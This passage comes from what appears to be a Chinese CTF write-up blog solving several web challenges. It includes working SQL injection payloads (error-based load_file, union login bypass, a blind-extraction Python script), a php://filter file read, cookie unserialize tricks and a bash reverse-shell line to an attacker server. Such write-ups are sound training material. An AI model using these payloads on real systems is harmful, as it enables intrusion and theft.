class="line">    show_source(__FILE__); </span><br><span class="line">&#125; </span><br><span class="line">elseif (unserialize($cookie) === &quot;$KEY&quot;) </span><br><span class="line">&#123;    </span><br><span class="line">    echo &quot;$flag&quot;; </span><br><span class="line">&#125; </span><br><span class="line">else &#123; </span><br><span class="line">?&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; </span><br><span class="line">&lt;title&gt;Login&lt;/title&gt; </span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; </span><br><span class="line">  &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; </span><br><span class="line">  &lt;/form&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">&#125; </span><br><span class="line">$KEY=&apos;ISecer:www.isecer.com&apos;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析一下这段代码，中间得到flag的代码是当<code>unserialize($cookie)</code>等于<code>$key</code>时，<br>但是key是在后面定义的，所以前面那个key是空的，我们可以在本地试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &apos;s:0:&quot;&quot;;&apos;;</span><br><span class="line">if(unserialize($str) === &quot;$hh&quot;)&#123;</span><br><span class="line"></span><br><span class="line">echo 1;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>可以发现是会回显1的，所以一样的道理，在请求头中添加:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:ISecer=s:0:&quot;&quot;;</span><br></pre></td></tr></table></figure></p><p>即可得到flag</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/71757553.jpg" alt="" title="" class="">                <p></p>            </figure><h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>说是sql注入，但是各种方法都试了，找了网上的writeup才发现是<code>.DS_Store</code>泄露，<br>什么是.DS_Store:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store 是 Mac OS X 系统中的临时文件，其中可能存放与目录相关的敏感信息。</span><br></pre></td></tr></table></figure></p><p>在网上找一个<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">.DS_Store利用工具</a></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/17587421.jpg" alt="" title="" class="">                <p></p>            </figure><p>直接就把flag文件下载下来了，打开即可拿到flag</p><h2 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h2><p>这题貌似也坏了</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>题目给出提示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">访问参数为：?id=x</span><br><span class="line"></span><br><span class="line">不允许包含“--”，空格，单引号，双引号，“union”关键字</span><br><span class="line">查询文件中包含“”（双引号）里面的内容，需要查询的文件路径为：/var/test/key_1.php</span><br></pre></td></tr></table></figure></p><p>需要查询的是一个文件，这里使用mysql的<code>load_file</code>这个函数,<br>题目很明显直接提示了是报错注入，先试试updatexml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10088/?id=1/**/and/**/updatexml(1,concat(0x7e,(select/**/@@version),0x7e),1)</span><br></pre></td></tr></table></figure></p><p>可以直接报错了，所以接下来使用<code>load_file</code>这个函数，因为substr的长度只有30位，<br>而且加载的是一个文件，所以需要多试试:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10088/?id=1/**/and/**/updatexml(1,concat(0x7e,substr(load_file(0x2f7661722f746573742f6b65795f312e706870),75,100),0x7e),1)</span><br></pre></td></tr></table></figure></p><p>大概就是75到125的位置得到的flag，但是提交的时候是中文的双引号，这个地方有点坑</p><h2 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h2><p>直接扫后台得到<code>show.php</code>，本来以为是一个代码审计，但是直接给出了flag..</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9002/show.php</span><br></pre></td></tr></table></figure><h2 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h2><p>首先拿到题目看了看源码没给提示，直接抓个包，在响应包中可以看到tip:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JHNxbD0iU0VMRUNUIHVzZXJuYW1lLHBhc3N3b3JkIEZST00gYWRtaW4gV0hFUkUgdXNlcm5hbWU9JyIuJHVzZXJuYW1lLiInIjsKaWYgKCFlbXB0eSgkcm93KSAmJiAkcm93WydwYXNzd29yZCddPT09bWQ1KCRwYXNzd29yZCkpewp9</span><br></pre></td></tr></table></figure><p>base64解码之后是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT username,password FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot;;</span><br><span class="line">if (!empty($row) &amp;&amp; $row[&apos;password&apos;]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是先提交的用户名之后再从数据中查询密码，随后再核对密码，然后也没有对username进行过滤的操作，<br>此时构造语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos; union select md5(1),md5(1) #</span><br></pre></td></tr></table></figure></p><p>理解起来很简单，就是先闭合前面的<code>单引号</code>，使得前面为空，然后联合查询出<code>md5(1)</code>，<br>随后将password置为1，就能绕过了</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-26/40985088.jpg" alt="" title="" class="">                <p></p>            </figure><p>进来之后是一个进程监测系统，随便输了几个字符：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-26/44783462.jpg" alt="" title="" class="">                <p></p>            </figure><p>发现了<code>sh -c ps -aux | grep</code>,能执行命令，所以很简单，弹个shell就行<br>直接bash弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; /dev/tcp/服务器ip/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p><p>拿到shell 之后 cat f*</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-26/84561059.jpg" alt="" title="" class="">                <p></p>            </figure><p>拿到flag</p><h2 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3(SKCTF)"></a>login3(SKCTF)</h2><p>题目先给了提示，基于布尔的SQL盲注，经过测试之后可以发现是有<code>admin</code>这个账户的，<br>除开提示密码错误，然后还提示用户不存在，<br>上脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">str_all=&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125;+-*/=&quot;</span><br><span class="line">url=&quot;http://118.89.219.210:49167/index.php&quot;</span><br><span class="line">r=requests.session()</span><br><span class="line"></span><br><span class="line">def password():</span><br><span class="line">    resutlt=&quot;&quot;</span><br><span class="line">    for i in range(40):</span><br><span class="line">        fla=0</span><br><span class="line">        for j in range(32,127):</span><br><span class="line">            playlod = &quot;admin&apos;^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#&quot;.format(str(i+1),str(j))</span><br><span class="line">            data = &#123;</span><br><span class="line">                &quot;username&quot;: playlod,</span><br><span class="line">                &quot;password&quot;: &quot;123&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            s=r.post(url,data)</span><br><span class="line">            if &quot;error&quot; in s.text:</span><br><span class="line">                resutlt+=chr(j)</span><br><span class="line">                fla=1</span><br><span class="line">                print(&apos;**************************&apos;,resutlt)</span><br><span class="line">        if fla==0:</span><br><span class="line">            break</span><br><span class="line">password()</span><br></pre></td></tr></table></figure><p>然后得到一串md5，解密得到flag{skctf123456}</p><h2 id="文件上传-湖湘杯"><a href="#文件上传-湖湘杯" class="headerlink" title="文件上传(湖湘杯)"></a>文件上传(湖湘杯)</h2><p>一开始试了很多方法绕过上传，但是没成功，然后看到了url:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9011/?op=upload</span><br></pre></td></tr></table></figure><p>居然有个可控的变量，然后发现这个变量是根据文件的名字进行读取的，<br>然后试了试:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9011/flag.php</span><br></pre></td></tr></table></figure><p>并且扫描发现存在<code>flag.php</code>，所以大概率是伪协议了，试了试:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9011/?op=php://filter//read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure></p><p>base64解码直接得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=&quot;flag&#123;e00f8931037cbdb25f6b1d82dfe5552f&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h2 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h2><p>这题是CBC字节翻转攻击,<a href="http://www.lmxspace.com/2018/05/07/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">参考l1nk3r大佬的文章</a><br>先扫目录得到<code>.index.php.swp</code>，恢复之后:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Login Form&lt;/title&gt;</span><br><span class="line">&lt;link href=&quot;static/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">$(document).ready(function() &#123;</span><br><span class="line">$(&quot;.username&quot;).focus(function() &#123;</span><br><span class="line">$(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);</span><br><span class="line">&#125;);</span><br><span class="line">$(&quot;.username&quot;).blur(function() &#123;</span><br><span class="line">$(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(&quot;.password&quot;).focus(function() &#123;</span><br><span class="line">$(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);</span><br><span class="line">&#125;);</span><br><span class="line">$(&quot;.password&quot;).blur(function() &#123;</span><br><span class="line">$(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">define(&quot;SECRET_KEY&quot;, file_get_contents(&apos;/root/key&apos;));</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $random_iv=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function login($info)&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is $flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line">    if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;body class=&quot;login-body&quot;&gt;</span><br><span class="line">                &lt;div id=&quot;wrapper&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span><br><span class="line">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>cbc字节翻转攻击的原理简单解释一下:</p><ul><li>首先将原文分成几个固定长度的块，然后有种对称加密算法来加密一些字符串，</li><li>其次还有一个叫Initialzation Vector(IV)的东西来保证明文在经过加密后，密文不相同的情况</li><li>然后最重要的一个就是CBC的算法（这里借助line大佬的公式方便理解一下）:<br>  加密:<br>  Ciphertext-0 = Encrypt(Plaintext XOR IV)—只用于第一个组块<br>  Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—用于第二及剩下的组块<br>  解密:<br>  Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块<br>  Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块</li></ul><p>攻击原理就是通过改变其中某个字符的值，来达到我们需要满足的目的，并且在这题中，改变的同时，其他的值还不能改变，否则反序列化会出错。</p><p>开始做题,<br>在我们随便拿一个帐号登录进去之后，可以看到:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-10-15/99461536.jpg" alt="" title="" class="">                <p></p>            </figure><p>同时对应的函数代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is $flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟踪一下，看看哪个地方调用了这个函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line">    if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>可以看到在调用这个函数之前还调用了<code>login</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function login($info)&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>login</code>的作用简单来说就是将传进去的用户名密码序列化，然后还有<u>将此时的用户名写进session中</u>，并且将序列化后的用户名密码进行加密，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>check_login</code>的作用跟<code>login</code>差不多是相反的，但是问题就出在此时的<code>$info</code>变量我们是可以通过cookie控制的，所以才有了cbc字节翻转攻击<br>回到第一段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line">    if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br></pre></td></tr></table></figure><p>如果将代码读明白了，可以很明显的知道，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if($username === &apos;admin&apos;)&#123;</span><br><span class="line">       exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">       $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">       login($info);</span><br><span class="line">       